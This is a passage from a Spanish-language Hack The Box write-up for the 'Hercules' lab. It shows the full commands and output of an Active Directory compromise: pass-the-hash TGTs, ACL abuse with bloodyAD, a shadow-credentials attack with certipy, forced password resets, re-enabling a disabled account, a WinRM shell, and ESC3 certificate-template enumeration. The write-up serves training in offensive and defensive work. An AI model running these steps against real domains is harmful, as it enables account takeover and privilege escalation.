```
Funcionó, tenemos un **Hash NT** del **usuario bob.w**.

Creamos un nuevo **TGT**, pero ahora del **usuario bob.w**:
```bash
impacket-getTGT -dc-ip 10.10.11.91 -hashes :8a65c74e8f0073babbfac6725c66cc3f hercules.htb/bob.w
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in bob.w.ccache
```
Lo tenemos, ahora podemos usar el **TGT** de este usuario para otras cosas.

Una de estas es enumerar el **AD** de nuevo, pero con la intención de ver qué permisos de escritura tiene este usuario.

#### Enumeración de AD Usando Herramienta bloodyAD y Hash NT del Usuario bob.w {#bloodyAD}

¿Para qué sirve la herramienta **bloodyAD**?

| **BloodyAD** |
|:------------:|
| *bloodyAD es un framework/“navaja suiza” para escalada de privilegios en Active Directory que se comunica directamente con controladores de dominio usando llamadas LDAP (y en algunos casos SAMR u otros RPCs) para enumerar, explotar y manipular objetos AD (usuarios, grupos, OUs, atributos, etc.). Está pensado para pentesters/rojo-teams y soporta varios métodos de autenticación (passwords claros, NTLM hashes, tickets Kerberos, certificados).* |

Y antes de avanzar más, este es un concepto clave que debemos tener bien claro:

| **Access Control List (ACL)** |
|:-----------------------------:|
| *Es una lista de reglas de permisos que se asocia a un objeto en Active Directory (usuario, grupo, OU, computadora, etc.). Cada objeto del AD tiene una ACL que define quién puede hacer qué sobre ese objeto.* |

Utilicemos **bloodyAD** para enumerar los detalles del **usuario bob.w**, obteniendo solo los atributos que puede escribir este usuario:
```bash
KRB5CCNAME=bob.w.ccache bloodyAD -u 'bob.w' -p '' -d 'hercules.htb' --host DC.hercules.htb get writable --detail -k

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=hercules,DC=htb
url: WRITE
wWWHomePage: WRITE
.
# OU Engineering Department
distinguishedName: OU=Engineering Department,OU=DCHERCULES,DC=hercules,DC=htb
device: CREATE_CHILD
ipNetwork: CREATE_CHILD
msPKI-Key-Recovery-Agent: CREATE_CHILD
...

# OU Security Department
distinguishedName: OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb
device: CREATE_CHILD
ipNetwork: CREATE_CHILD
msPKI-Key-Recovery-Agent: CREATE_CHILD
...

# OU Web Department
distinguishedName: OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb
device: CREATE_CHILD
ipNetwork: CREATE_CHILD
msPKI-Key-Recovery-Agent: CREATE_CHILD
...

# Usuarios que pueden modificar OU Security Department
distinguishedName: CN=Auditor,OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb
name: WRITE
cn: WRITE
...
distinguishedName: CN=Stephen Miller,OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb
name: WRITE
cn: WRITE
...

# Usuarios que pueden modificar OU Web Department
distinguishedName: CN=Bob Wood,OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb
thumbnailPhoto: WRITE
pager: WRITE
mobile: WRITE
homePhone: WRITE
userSMIMECertificate: WRITE
msDS-ExternalDirectoryObjectId: WRITE
msDS-cloudExtensionAttribute20: WRITE
...
userCert: WRITE
userCertificate: WRITE
...
```

Del resultado de este comando, dejé la mayoría de lo que es importante y lo resumo:
* Tenemos **CREATE_CHILD** en **OUs** importantes (**Engineering, Security, Web**),es decir, podemos crear objetos dentro de esas **OUs**: usuarios y computers incluidos.
* Tenemos **WRITE** sobre muchos atributos `userCertificate, userCert, msPKI*, msDS-AllowedToActOnBehalfOfOtherIdentity` (y similares) en usuarios concretos (ej. **CN=Bob Wood**), es deicr, podemos escribir/inyectar certificados o **tokens PKI** en el objeto de usuario.
* Tenemos **WRITE** sobre `name / cn` de muchos usuarios (**Stephen Miller, Auditor**, etc.), es decir, podemos renombrar/ajustar atributos identificadores o manipular el `cn/name`.

La diferencia entre los **OU**, es que el **OU Web Deparment**, es el más permisivo, ya que es quien nos permite crear los certificados de otros usuarios, sin que tengamos sus contraseñas.

Recuerda que nuestro objetivo principal es llegar al **usuario auditor**, pero de momento, podemos aprovecharnos del **usuario stephen.m**.

Para este usuario, que pertenece al grupo **Security Helpdesk**, podemos moverlo al **OU Web Department** para que herede **ACLs** más permisivas de este **OU**.

Esto con el fin de que podamos obtener un certificado y **TGT** de él, para después abusar de sus **ACLs**, con tal de que podamos llegar al **usuario auditor** y nos podamos autenticar como este.

### Moviendo Usuario stephen.m al OU Web Department para Abusar de sus ACLs y Podamos Ganar Acceso al AD como Usuario Auditor {#MovingToOU}

Para que podamos mover a este usuario, tenemos que autenticarnos dentro de la máquina.

Esto lo podemos hacer utilizando obteniendo una sesión de **LDAPS** con **PowerView**.

Podemos instalarlo como una librería de **Python** de la siguiente manera:
```bash
pip install "git+https://github.com/aniqfakhrul/powerview.py"
```

Usando el mismo **TGT** del **usuario bob.w** y junto a **PowerView**, podemos obtener una sesión del **servicio LDAPS**, para evitar errores y bloqueos:
```bash
KRB5CCNAME=bob.w.ccache powerview hercules.htb/bob.w@dc.hercules.htb -k --use-ldaps -d --no-pass
Logging directory is set to /root/.powerview/logs/hercules-bob.w-dc.hercules.htb
[2025-10-25 00:37:06] [ConnectionPool] Started LDAP connection pool cleanup thread
[2025-10-25 00:37:06] [ConnectionPool] Started LDAP connection pool keep-alive thread
[2025-10-25 00:37:06] LDAP sign and seal are supported
[2025-10-25 00:37:06] TLS channel binding is supported
[2025-10-25 00:37:06] Authentication: SASL, User: bob.w@hercules.htb
[2025-10-25 00:37:06] Connecting to dc.hercules.htb, Port: 636, SSL: True
[2025-10-25 00:37:06] Using Kerberos Cache: bob.w.ccache
[2025-10-25 00:37:06] SPN LDAP/DC.HERCULES.HTB@HERCULES.HTB not found in cache
[2025-10-25 00:37:06] AnySPN is True, looking for another suitable SPN
[2025-10-25 00:37:06] Returning cached credential for KRBTGT/HERCULES.HTB@HERCULES.HTB
[2025-10-25 00:37:06] Using TGT from cache
[2025-10-25 00:37:06] Trying to connect to KDC at dc.hercules.htb:88
[2025-10-25 00:37:08] [Storage] Using cache directory: /root/.powerview/storage/ldap_cache
[2025-10-25 00:37:08] [VulnerabilityDetector] Created default vulnerability rules at /root/.powerview/vulns.json
[2025-10-25 00:37:08] [Get-DomainObject] Using search base: DC=hercules,DC=htb
[2025-10-25 00:37:08] [Get-DomainObject] LDAP search filter: (&(1.2.840.113556.1.4.2=*)(|(samAccountName=bob.w)(name=bob.w)(displayName=bob.w)(objectSid=bob.w)(distinguishedName=bob.w)(dnsHostName=bob.w)(objectGUID=*bob.w*)))
[2025-10-25 00:37:08] [ConnectionPool] LDAP added connection for domain: hercules.htb
╭─LDAPS─[dc.hercules.htb]─[HERCULES\bob.w]-[NS:<auto>]
╰─PV ❯
```
Estamos dentro.

Ahora podemos mover a **stephen.m** al **OU Web Department**:
```bash
╭─LDAPS─[dc.hercules.htb]─[HERCULES\bob.w]-[NS:<auto>]
╰─PV ❯ Set-DomainObjectDN -Identity stephen.m -DestinationDN 'OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb'
[2025-10-25 00:37:24] [Get-DomainObject] Using search base: DC=hercules,DC=htb
[2025-10-25 00:37:24] [Get-DomainObject] LDAP search filter: (&(1.2.840.113556.1.4.2=*)(|(samAccountName=stephen.m)(name=stephen.m)(displayName=stephen.m)(objectSid=stephen.m)(distinguishedName=stephen.m)(dnsHostName=stephen.m)(objectGUID=*stephen.m*)))
[2025-10-25 00:37:24] [Get-DomainObject] Using search base: DC=hercules,DC=htb
[2025-10-25 00:37:24] [Get-DomainObject] LDAP search filter: (&(1.2.840.113556.1.4.2=*)(distinguishedName=OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb))
[2025-10-25 00:37:24] [Set-DomainObjectDN] Modifying CN=STEPHEN MILLER,OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb object dn to OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb
[2025-10-25 00:37:24] [Set-DomainObject] Success! modified new dn for CN=STEPHEN MILLER,OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb
```
Funcionó, esto hará que este usuario herede todos los **ACLs** de ese **OU**.

Intentemos crear un certificado y **TGT** de **stephen.m**, pero necesitaremos nuevamente al **usuario natalie.a**.

Creamos nuevamente el **TGT** del **usuario natalie.a**:
```bash
impacket-getTGT 'HERCULES.HTB/natalie.a:Prettyprincess123!'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in natalie.a.ccache
```

Y ahora creamos el certificado del **usuario stephen.m** para obtener un **Hash NT**:
```bash
KRB5CCNAME=natalie.a.ccache certipy-ad shadow auto -u natalie.a@hercules.htb -dc-host DC.hercules.htb -account 'stephen.m' -k
Certipy v5.0.3 - by Oliver Lyak (ly4k)
...
[*] Targeting user 'stephen.m'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '1682f000a782475d870db85936131460'
[*] Adding Key Credential with device ID '1682f000a782475d870db85936131460' to the Key Credentials for 'stephen.m'
[*] Successfully added Key Credential with device ID '1682f000a782475d870db85936131460' to the Key Credentials for 'stephen.m'
[*] Authenticating as 'stephen.m' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'stephen.m@hercules.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'stephen.m.ccache'
[*] Wrote credential cache to 'stephen.m.ccache'
[*] Trying to retrieve NT hash for 'stephen.m'
[*] Restoring the old Key Credentials for 'stephen.m'
[*] Successfully restored the old Key Credentials for 'stephen.m'
[*] NT hash for 'stephen.m': 9aaaedcb19e612216a2dac9badb3c210
```
Lo tenemos.

Ya podemos crearle un **TGT**:
```bash
impacket-getTGT HERCULES.HTB/stephen.m -hashes :9aaaedcb19e612216a2dac9badb3c210
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in stephen.m.ccache
```
Recordemos que el grupo **Security Desktop**, donde estaba el **usuario stephen.m**, tiene el atributo **ForceChangePassword** sobre el **usuario auditor**.

Entonces, podemos cambiarle la contraseña al usuario auditor, por una que queramos sin ninguna restricción:

<p align="center">
<img src="/assets/images/htb-writeup-hercules/Captura37.png">
</p>

<p align="center">
<img src="/assets/images/htb-writeup-hercules/Captura38.png">
</p>

Podemos hacer esto con **bloodyAD**:
```bash
KRB5CCNAME=stephen.m.ccache bloodyAD --host DC.hercules.htb -d hercules.htb -u 'stephen.m' -k set password Auditor 'Prettyprincess123!'
[+] Password changed successfully!
```
Listo, la cambiamos por la misma contraseña que tiene el **usuario natalie.a**.

Creamos el **TGT** del **usuario auditor**:
```bash
impacket-getTGT -dc-ip 10.10.11.91 hercules.htb/Auditor:Prettyprincess123!
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in Auditor.ccache
```

Y para conectarnos, usaremos la herramienta **winrmexec**:
* <a href="https://github.com/ozelis/winrmexec" target="_blank">Repositorio de ozelis: winrmexec</a>

Clona el repositorio:
```bash
git clone https://github.com/ozelis/winrmexec.git
```

Lo ejecutamos usando el **TGT** del **usuario auditor**:
```batch
KRB5CCNAME=Auditor.ccache python3 winrmexec/evil_winrmexec.py -ssl -port 5986 -k -no-pass dc.hercules.htb
...
PS C:\Users\auditor\Documents> whoami
hercules\auditor
```
Estamos dentro.

En el directorio **Desktop**, encontraremos la flag del usuario:
```batch
PS C:\Users\auditor\Documents> cd ../Desktop
PS C:\Users\auditor\Desktop> dir

    Directory: C:\Users\auditor\Desktop

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---        10/25/2025  10:54 AM             34 user.txt

PS C:\Users\auditor\Desktop> type user.txt
```

## Post Explotación {#Post}

### Asignando Dueño y Permiso GenericAll a Usuario Auditor sobre OU Forest Migration para Tener su Control Total {#FMigration}

Veamos a qué grupos pertenece este usuario:
```batch
PS C:\Users\auditor\Desktop> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                           Attributes                                        
========================================== ================ ============================================= ==================================================
Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access    Alias            S-1-5-32-574                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
HERCULES\Domain Employees                  Group            S-1-5-21-1889966460-2597381952-958560702-1108 Mandatory group, Enabled by default, Enabled group
HERCULES\Forest Management                 Group            S-1-5-21-1889966460-2597381952-958560702-1104 Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity Well-known group S-1-18-1                                      Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192
```
Observa que está dentro del grupo **Forest Management**.

| **Forest Management** |
|:---------------------:|
| *Es un grupo de seguridad en Active Directory (no es algo "de Microsoft" por defecto — es creado por administradores). Su propósito habitual: agrupar cuentas y servicios responsables de tareas a nivel de forest (gestión global, CA, replicación, cambios de esquema, migraciones, etc.). Miembros típicos: cuentas de administradores, service accounts para herramientas de gestión/migración.* |

Curiosamente, este grupo se relaciona con el **OU Forest Migration**:

| **OU Forest Migration** |
|:-----------------------:|
| *Es una Organizational Unit (carpeta lógica) creada para operaciones de migración entre dominios/forests o para agrupar objetos temporales durante procesos administrativos. Su uso tipico es: Zona de staging para cuentas/objetos que se migran. Lugar donde se aplican GPOs/ACLs específicas usadas durante migraciones. Contiene cuentas de servicio o copias de objetos migrados hasta que se validen.* |

Estos dos tienen una relación operativa, donde el grupo **Forest Management** suele ser el equipo (o los accounts) que administran la **OU Forest Migration**.

Podemos revisar que **ACLs** tiene el **OU Forest Migration** sobre el grupo **Forest Management**.

Para esto, cargamos el módulo **ActiveDirectory** y ejecutamos el siguiente comando:
```batch
PS C:\Users\auditor\Desktop> Import-Module ActiveDirectory
PS C:\Users\auditor\Desktop> (Get-ACL "AD:OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb").Access | Where-Object {$_.IdentityReference-like "*Forest Management*"} | Format-List *

ActiveDirectoryRights : GenericRead
InheritanceType       : All
ObjectType            : 00000000-0000-0000-0000-000000000000
InheritedObjectType   : 00000000-0000-0000-0000-000000000000
ObjectFlags           : None
AccessControlType     : Allow
IdentityReference     : HERCULES\Forest Management
IsInherited           : False
InheritanceFlags      : ContainerInherit
PropagationFlags      : None

ActiveDirectoryRights : GenericAll
InheritanceType       : None
ObjectType            : 00000000-0000-0000-0000-000000000000
InheritedObjectType   : 00000000-0000-0000-0000-000000000000
ObjectFlags           : None
AccessControlType     : Allow
IdentityReference     : HERCULES\Forest Management
IsInherited           : False
InheritanceFlags      : None
PropagationFlags      : None
```

Te explico el comando:
* `Get-ACL "AD:OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb"`: Lee la **ACL** del **AD** cuyo path se pasa al proveedor **AD** de **PowerShell**. En este caso la **OU Forest Migration** dentro del contenedor **DCHERCULES** en el dominio **hercules.htb**. 
* `.Access`: Del objeto **ACL** devuelve la colección de **ACE (Access Control Entries)**. Cada entrada que describe quién (**IdentityReference**) tiene qué permiso (**ActiveDirectoryRights**) sobre ese objeto.
* `Where-Object { $_.IdentityReference -like "*Forest Management*" }`: Filtra las **ACEs** dejando solo aquellas cuyo **IdentityReference** (el sujeto al que se le aplica la **ACE**) coincide con la cadena **Forest Management**. Es decir: **ACEs** que afectan al grupo **Forest Management** (o cualquier objeto cuyo nombre contenga esa cadena).
* `Format-List *`: Formatea la/s **ACE/s** resultantes mostrando todas sus propiedades (para que veas detalles como **IdentityReference, ActiveDirectoryRights, AccessControlType, ObjectType, InheritanceFlags, IsInherited**, etc.).

Del resultado, vemos que tenemos el permiso **GenericAll** sobre el **OU Forest Migration**, lo cual es bastante crítico.

Pues si asignamos ese permiso a nuestro usuario, tendremos control total sobre este **OU**, permitiéndonos:
* Manipular los objetos (usuarios) existentes en el **OU**. 
* Crear nuevos objetos.
* Capacidad para restablecer las contraseñas de usuario existentes y más.

Podemos poner al **usuario auditor** como el dueño del **OU Forest Migration** con **bloodyAD**:
```bash
KRB5CCNAME=Auditor.ccache bloodyAD --host DC.hercules.htb -d hercules.htb -u Auditor -p 'Prettyprincess123!' -k set owner 'OU=FOREST MIGRATION,OU=DCHERCULES,DC=HERCULES,DC=HTB' Auditor
[!] S-1-5-21-1889966460-2597381952-958560702-1128 is already the owner, no modification will be made
```
Aunque nos menciona que ya es dueño, siempre es importante asegurarnos.

Ya solo le agregamos el permiso **GenericAll**:
```bash
KRB5CCNAME=Auditor.ccache bloodyAD --host dc.hercules.htb -d hercules.htb -u Auditor -k add genericAll 'OU=FOREST MIGRATION,OU=DCHERCULES,DC=HERCULES,DC=HTB' Auditor
[+] Auditor has now GenericAll on OU=FOREST MIGRATION,OU=DCHERCULES,DC=HERCULES,DC=HTB
```
Listo, con esto ya tenemos control total de este **OU**.

### Rehabilitando Cuenta Deshabilitada de Usuario Fernando.R {#Fernando}

Podemos investigar qué usuarios regulares existen en este **OU**:
```batch
PS C:\Users\auditor\Desktop> Get-ADUser -SearchBase "OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb" -Filter * -Properties adminCount,UserAccountControl |
  Where-Object { ($_.adminCount -ne 1) -or ($_.adminCount -eq $null) } |
  Select-Object SamAccountName,DistinguishedName,adminCount,UserAccountControl

SamAccountName DistinguishedName                                                          adminCount UserAccountControl
-------------- -----------------                                                          ---------- ------------------
james.s        CN=James Silver,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb                               66050
anthony.r      CN=Anthony Rudd,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb                               66050
taylor.m       CN=Taylor Maxwell,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb                             66050
fernando.r     CN=Fernando Rodriguez,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb                         66050
```
Todos estos usuarios están deshabilitados.

Pero uno de estos nos puede llamar la atención, siendo el **usuario fernando.r**:
```batch
PS C:\Users\auditor\Desktop> Get-ADUser -Identity "Fernando.R"

DistinguishedName : CN=Fernando Rodriguez,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb
Enabled           : False
GivenName         : Fernando
Name              : Fernando Rodriguez
ObjectClass       : user
ObjectGUID        : 80ea16f3-f1e3-4197-9537-e756c2d1ebb0
SamAccountName    : fernando.r
SID               : S-1-5-21-1889966460-2597381952-958560702-1121
Surname           : Rodriguez
UserPrincipalName : fernando.r@hercules.htb
```

Si lo investigamos desde **BloodHound**, veremos que se encuentra en algunos grupos:

<p align="center">
<img src="/assets/images/htb-writeup-hercules/Captura39.png">
</p>

Resulta que el grupo **Smartcard Operators** tiene una descripción peculiar:

<p align="center">
<img src="/assets/images/htb-writeup-hercules/Captura40.png">
</p>

Los miembros de este grupo, tienen algún grado de control sobre la **Autoridad de Certificación (CA)** del entorno, lo que les permite emitir, revocar, aprobar o configurar certificados.

Aprovechemos los privilegios que tenemos en este **OU** y habilitemos la cuenta del **usuario fernando.r**.

Para habilitarlo, usaremos **bloodyAD**:
```bash
KRB5CCNAME=Auditor.ccache bloodyAD --host DC.hercules.htb -d 'hercules.htb' -u 'auditor' -k remove uac 'fernando.r' -f ACCOUNTDISABLE
[-] ['ACCOUNTDISABLE'] property flags removed from fernando.r's userAccountControl
```
Ya está habilitado.

Lo podemos comprobar revisando su descripción de nuevo:
```batch
PS C:\Users\auditor\Desktop> Get-ADUser -Identity "Fernando.R"

DistinguishedName : CN=Fernando Rodriguez,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb
Enabled           : True
GivenName         : Fernando
Name              : Fernando Rodriguez
ObjectClass       : user
ObjectGUID        : 80ea16f3-f1e3-4197-9537-e756c2d1ebb0
SamAccountName    : fernando.r
SID               : S-1-5-21-1889966460-2597381952-958560702-1121
Surname           : Rodriguez
UserPrincipalName : fernando.r@hercules.htb
```

Y como no sabemos su contraseña, vamos a asignarle una nueva:
```bash
KRB5CCNAME=Auditor.ccache bloodyAD --host DC.hercules.htb -d hercules.htb -u Auditor -k set password 'fernando.r' 'Password123!'
[+] Password changed successfully!
```
Bien, tenemos a otro usuario a nuestra disposición.

### Identificando CAs Vulnerables y Aplicando ESC3 Certificate Attack: Enrollment Agent Template {#BadCAs}

Antes que nada, debemos saber algunos conceptos:

| **Plantilla ESC3** |
|:------------------:|
| *ESC3 (según la nomenclatura que usan herramientas como Certipy) se refiere a plantillas de certificado de tipo Enrollment Agent que incluyen el EKU Certificate Request Agent. * |

| **Enrollment Agent** |
|:--------------------:|
| *Es el rol/tipo de certificado y plantilla diseñada para emitir certificados actuando como agente: un EA puede firmar o tramitar solicitudes on-behalf-of (en nombre de) otras cuentas en ciertos flujos de AD CS.* |

Ahora sí, ¿De qué va este ataque?

| **ESC3 Certificate Attack** |
|:---------------------------:|
| *Un ESC3 attack es el abuso de esa plantilla/funcionalidad para obtener certificados que permitan solicitar (o firmar) certificados en nombre de otras identidades, posibilitando la suplantación de cuentas y la obtención de material de autenticación (PFX/TGT) sin conocer contraseñas.* |

Con un certificado de **Enrollment Agent** y permisos adecuados en la **CA/plantillas**, podríamos:
* Obtener certificados válidos para otras cuentas del dominio.
* Usar ese certificado para autenticación basada en certificados (**PKINIT** o **cert-based auth**) y, por lo tanto, obtener **TGTs** o acceso a servicios como si fuera la cuenta objetivo.

Aquí te dejo un blog que explica este ataque:
* <a href="https://www.hackingarticles.in/adcs-esc3-enrollment-agent-template/" target="_blank">ADCS ESC3: Enrollment Agent Template</a>

Ocuparemos al **usuario fernando.r**, así que vamos a crearle un **TGT**:
```bash
impacket-getTGT 'HERCULES.HTB/fernando.r:NewPassword123!'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in fernando.r.ccache
```

Busquemos las plantillas de certificados vulnerables con **certipy-ad**:
```bash
KRB5CCNAME=fernando.r.ccache certipy-ad find -k -dc-ip 10.10.11.91 -target DC.hercules.htb -vulnerable -stdout
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 18 enabled certificate templates
[*] Finding issuance policies
[*] Found 14 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'CA-HERCULES' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'CA-HERCULES'
[*] Checking web enrollment for CA 'CA-HERCULES' @ 'dc.hercules.htb'
...
Certificate Templates
  0
    Template Name                       : MachineEnrollmentAgent
    Display Name                        : Enrollment Agent (Computer)
    Certificate Authorities             : CA-HERCULES
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : True
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireDns
                                          SubjectRequireDnsAsCn
    Enrollment Flag                     : AutoEnrollment
    Extended Key Usage                  : Certificate Request Agent
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-12-04T01:44:26+00:00
    Template Last Modified              : 2024-12-04T01:44:51+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : HERCULES.HTB\Smartcard Operators
                                          HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : HERCULES.HTB\Enterprise Admins
        Full Control Principals         : HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
        Write Owner Principals          : HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
        Write Dacl Principals           : HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
        Write Property Enroll           : HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
    [+] User Enrollable Principals      : HERCULES.HTB\Smartcard Operators
    [!] Vulnerabilities
      ESC3                              : Template has Certificate Request Agent EKU set.
  1
    Template Name                       : EnrollmentAgentOffline
    Display Name                        : Exchange Enrollment Agent (Offline request)
    Certificate Authorities             : CA-HERCULES
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : True
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Certificate Request Agent
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-12-04T01:44:26+00:00
    Template Last Modified              : 2024-12-04T01:44:51+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : HERCULES.HTB\Smartcard Operators
                                          HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : HERCULES.HTB\Enterprise Admins
        Full Control Principals         : HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
        Write Owner Principals          : HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
        Write Dacl Principals           : HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
        Write Property Enroll           : HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
    [+] User Enrollable Principals      : HERCULES.HTB\Smartcard Operators
    [!] Vulnerabilities
      ESC3                              : Template has Certificate Request Agent EKU set.
      ESC15                             : Enrollee supplies subject and schema version is 1.
    [*] Remarks
      ESC15                             : Only applicable if the environment has not been patched. See CVE-2024-49019 or the wiki for more details.
  2
    Template Name                       : EnrollmentAgent
    Display Name                        : Enrollment Agent
    Certificate Authorities             : CA-HERCULES
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : True
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : AutoEnrollment
    Extended Key Usage                  : Certificate Request Agent
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-12-04T01:44:26+00:00
    Template Last Modified              : 2024-12-04T01:44:51+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : HERCULES.HTB\Smartcard Operators
                                          HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : HERCULES.HTB\Enterprise Admins
        Full Control Principals         : HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
        Write Owner Principals          : HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
        Write Dacl Principals           : HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
        Write Property Enroll           : HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
    [+] User Enrollable Principals      : HERCULES.HTB\Smartcard Operators
    [!] Vulnerabilities
      ESC3                              : Template has Certificate Request Agent EKU set.
```
Es un resultado bastante largo, pero es necesario para que lo pueda explicar.

En resumen:
* Se encontro solo 1 **CA** siendo el `CA-HERCULES` dentro del **dc.hercules.htb**:
	* **Web Enrollment (HTTP/HTTPS)** está **Disabled** para esa **CA**, osea que no podremos usar la interfaz web para pedir certificados.
* Obtuvimos los permisos de la CA: 
	* **Enroll** en la **CA** aparece como `HERCULES.HTB\Authenticated Users`. Eso indica que cualquier usuario autenticado puede pedir certificados a la **CA** en algún flujo (pero plantillas individuales controlan qué se puede emitir).
	* **ManageCa / ManageCertificates** están limitados a administradores (Administrators, Domain Admins, Enterprise Admins).

* Plantillas detectadas: 
	* Encontró 34 templates, de las cuales 18 están habilitadas.
	* Para cada template Certipy lista flags relevantes, como: **MachineEnrollmentAgent**, **Enrollment Agent (True)**, **Enrolment Supplies (False)** y **Enrolment Rights** (**Smartcard Operators, Domain Admins, Enterprise Admins**).
	* Se detecto una vulnerabilidad: **VULNERABILITY**: **ESC3** : `Template has Certificate Request Agent EKU set`.

* Vulnerabilidades:
	* **ESC3 template** tiene **Certificate Request Agent EKU**.
	* **ESC15 Enrollee supplies subject and schema version is 1** (**Certipy** advierte que **ESC15** solo aplica si el entorno no ha sido parcheado, aplicable el **CVE-2024-49019**.
	* **User Enrollable Principals** incluye **Smartcard Operators**: usuarios en ese grupo pueden solicitar/autoenrolar esta plantilla.

En general, la vulnerabilidad que vemos es **ESC3 Certificate Attack**.

La idea es abusar del **usuario fernando.r** para suplantarlo y crear certificados válidos que nos permitan convertirnos en otro usuario, siendo el **usuario ashley.b** nuestro siguiente objetivo.

Esto porque dicho usuario puede conectarse también vía **WinRM**, por lo que igual debe tener ciertos privilegios.

Para poder aplicarlo, usaremos la herramienta **certipy-ad**.

Puede que el ataque falle si es que no estamos en el mismo horario que la máquina **AD**, por lo que usaremos el comando **ntpdate** para ponernos en el mismo horario:
```bash
ntpdate -u dc.hercules.htb
2025-10-25 00:46:46.117561 (-0600) -0.009117 +/- 0.044474 dc.hercules.htb 10.10.11.91 s1 no-leap
```

